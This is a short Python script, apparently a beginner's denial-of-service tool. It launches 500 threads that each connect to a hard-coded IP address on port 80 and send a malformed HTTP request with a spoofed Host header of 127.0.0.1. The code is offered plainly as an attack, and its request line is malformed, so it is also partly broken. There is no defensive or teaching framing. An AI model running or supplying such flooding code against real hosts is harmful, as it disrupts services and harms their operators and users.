import threading
import socket

target = "166.117.111.4"
port=80
fake_ip="127.0.0.1"
already_connected=0

def attack():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()
    
    global already_connected
    already_connected =already_connected + 1
    print(already_connected)
    
for i in range(500):
    t=threading.Thread(target=attack)
    t.start()
